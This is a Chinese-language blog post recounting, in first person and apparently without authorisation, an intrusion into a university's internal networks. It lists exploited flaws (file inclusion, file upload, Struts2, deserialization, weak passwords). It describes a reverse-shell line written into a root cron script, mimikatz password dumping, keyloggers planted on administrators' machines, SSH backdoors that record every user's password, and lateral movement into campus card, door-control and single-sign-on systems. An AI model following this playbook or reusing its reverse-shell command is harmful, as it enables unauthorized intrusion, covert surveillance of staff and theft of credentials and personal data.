---
title: 内网漫游
date: 2017-09-18 11:11:58
tags: 个人
password: "wo de offer ne?"
---
### 内网漫游经历
#### 学校内网
1. 信息收集
```txt
    1. 大致分析每个网段的作用。入61,64,71等网段的应用服务器。
    2. 摸索waf型号，版本等等
    3. 收集服务器的web信息, 框架版本, 扩展
    4. 收集一些网站管理员信息
    5. 收集网段与网段之间的信息，也就是waf过滤端口规则
```

2. 漏洞发现
```txt
    1. 非waf网段的本地文件包含, 1433 对外开放(新校区)
    2. 运维监控服务器的插件任意文件上传
    3. 核心有waf网段的tomcat 弱口令
    4. 核心有waf网段java反序列化
    5. 核心有waf网段 struct2
    6. 校内网络认证服务器 struct2

    运营商
    7. 移动内网弱口令及任意文件上传

    教务
    8. 明文密码写在js里面
    9. 水平越权漏洞，存在接口可以直接看别人的个人信息，考试成绩等等
```

3. 渗透过程
(1). (新校区)本地文件包含
```txt
    1. 包含到配置文件, 发现数据库
    2. 连接数据库, 权限查询, 提权失败。
    3. 数据库密码进行administrator密码测试，成功登陆
    4. 发现管理员没有注销。mimikatz抓lsass.exe的密码
    5. 留后门
```

(2). 运维监控服务器的插件任意文件上传
```txt
    1. weathermap 任意文件上传, getshell
    2. 管理员发现, 重命名 bt.php.hackhole
    3. apache解析漏洞, 本质还是执行php
    4. ps -aux 发现很多root进程, 其中发现一个root的crontab对一个php脚本(可改)5分钟执行一次
    5. 增加system('bash -i >& /dev/tcp/1.1.1.1/2333 0>&1'); 其他同理
    6. 安装ssh后门
```

(3). 核心网段
```txt
    1. 人事处java反序列化，较为鸡肋，只拿下了人事处一台机器
    2. tomcat弱口令，上传war包马发现是内网映射出的一台机器，mimikatz抓密码，拿下整个小内网(10几台)
    3. struct2 校园卡，修复不及时。拿下一台入口机器，里面是绝对隔离的内网(未深入)
```

(4). 校内网络认证服务器
```txt
    1. struct2 已经被人拿下shell
    2. 附属相关的一台机器也被人拿下
```
4. 后渗透
多个互相隔离的网段,
(1). (新校区)本地文件包含
```txt
    * 管理员(计算中心)
        0. ipconfig --> 内网扫描
        1. 查看曾经远程桌面的ip，尝试进行登录。有几台登录成功，mimikatz抓取密码。
        2. 登录成功的几台机器上发现一个小本本，存放有全部机器的administrator的密码，一部分不能登录，但是可用当前管理员账号登录
        3. 发现一台linux, 根据某机器上面的小本本，拿下linux root.又发现小内网一台放oracle的linux，密码相同
        4. 同样这个cms的本地文件包含拿下计算中心主页
    * 管理员(党校)
         1. 党校与当前服务器相同，直接可以上数据库增删改查。含有很多用户的信息。密码是自定义的加密算法，可以逆出明文
         2. 查看远程桌面发现此管理员是一个开发, 运维网段有一台开发机, 尝试密码登录成功
         3. 信息收集, 大量应用服务器的ftp账号密码, 但是邮箱有2次密码，安装keylogger记录
         4. 信息收集, 邮箱密码抓到后发现无太大价值东西。
    * 管理员(超算中心)
        0. ipconfig --> 内网扫描
        1. 发现putty, vnc-view，收集信息一圈无用。安装keylogger
        2. 记录一段时间信息，抓到root密码
        3. 测试发现，管理员密码弱口令
        4. 信息收集：发现超算是一台认证服务器之后公私钥进行登录到其他服务器的。
        5. 安装ssh后门，记录全部用户的账号密码，拿下整个超算
        6. bash_history 发现此管理员邮箱密码，登录后发现是security邮件组管理员, 学校外部漏洞等可以方便查看
        7. 信息收集。其百度云盘发现学校防火墙配置, 一些文件集合,
```

(2). 运维监控服务器的插件任意文件上传
```txt
    1. 拿下root之后进行信息收集, /etc/hosts /etc/shadow /etc/passwd, .bash_history 等等，配置文件发现一个139邮箱的账号密码
    2. ipconfig --> 内网扫描
    3. ssh 后门记录的root密码爆破密码，爆破多台机器，装后门
    4. 每个机器信息收集，发现一台机器是运维常用的。发现处理二层设备的脚本，装好了nmap
    5. 运维网段，root密码相同的，发现是一些运维的管理平台，php编写。密码不可破解。留php记录密码
    6. 发现smb服务，拿下整个学校网络拓扑图，配置文件等等
    7. 根据邮箱密码, root密码等组合，爆破出运维vpn root密码, 此vpn可以直接管理二层设备
    8. 校内网络管理getshell, 全部老师的校内网认证，财务vpn及运维vpn(未深入)
    6. 方程式0day爆发打内网，拿下两台windows的机器，一台负责学生网段dhcp，一台是机房监控的服务器，可以远程开关门

    跨网段
    5. 继续扫描监控其他网段，某核心网段机器的22端口开放，尝试ssh后门密码登录成功。
    6. 拿下一个内网的dns服务器，接着进行对内网扫描。发现是邮件服务器的同一网段，(没有拿下邮件服务器)
    7. 发现一个思科管理kvm的平台，弱口令(没发现怎么利用)
```

(3). 应用服务器核心网段
```txt
    1. war包上传代理，reGeorg正向http代理
    2. 扫描内网发现，ftp弱口令(需要代理), 上传shell后serv-u提权, 拿下此站发现是一个站群
    3. 继续信息收集，发现可以有与门户单点认证相关的操作，于是翻到oracle的配置等, 拿下学校门户单点认证数据库全部数据(未脱裤)
    4. 通过代理，struct2攻击校园卡平台，拿下一台机器权限。抓密码，发现密码和hostname存在规律，尝试其他机器成功，拿下三台校园卡机器(存在域，未深入)
```

先想到这么多, 等想起来接着写

##### 总结
1. 学校安全大体上还是不错的，人员分工明确，应用服务器vm构架，定时进行恢复备份
2. 但是绝大部分的不错是基于网络产品，一些waf对恶意流量清洗和对恶意攻击屏蔽
3. waf部署不全，部分应用服务器可以被直接拿下，之后进行跨网段可能可以对一些waf规则进行绕过
4. 存在运维弱口令，密码长期不修改等等问题
5. 对一些新爆发的漏洞监控不及时，修复周期长会导致getshell
6. 外包开发，对某些漏洞修复很草率。外包产品一些将用户明文密码在js中展示，水平垂直权限配置十分不合理


